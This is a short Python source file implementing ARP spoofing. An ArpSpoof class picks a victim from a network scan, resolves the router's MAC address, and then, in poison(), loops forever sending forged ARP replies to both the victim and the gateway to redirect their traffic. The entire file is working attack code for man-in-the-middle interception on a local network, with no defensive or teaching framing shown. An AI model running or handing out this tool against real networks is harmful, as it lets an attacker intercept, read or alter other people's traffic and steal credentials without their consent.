"""Arp Spoofing/Poisoning"""
import time
from arp import Arp
from network_scanner import NetworkScanner


class ArpSpoof(Arp):
    """Arp Spoofing Related Methods
    """

    def __init__(self, scanner: NetworkScanner):
        self.scanner = scanner
        self.router_ip = self.scanner.get_gate()  # pylint: disable=fixme, no-member
        self.victim = self.scanner.menu()
        self.router_mac = self.get_router_mac()

    def get_router_mac(self):
        """Get the Mac address of the router

        Returns:
            str: router mac address
        """
        self.send_arp(self.scanner.mac_addr, self.scanner.ip_addr, self.router_ip)
        response = None
        while response is None:
            response = self.recv_arp()
        return response[1]

    def poison(self):
        """Execute arp spoofing
        """
        print("[*] Poisoning...")
        while True:
            self.send_arp(src_ip=self.router_ip, dst_ip=self.victim[0],
                          src_mac=self.router_mac, dst_mac=self.victim[1], operation=2)  # From the router to the victim
            self.send_arp(src_ip=self.victim[0], dst_ip=self.router_ip,
                          src_mac=self.victim[1], dst_mac=self.router_mac, operation=2)  # From the victim to the router
            time.sleep(1.5)
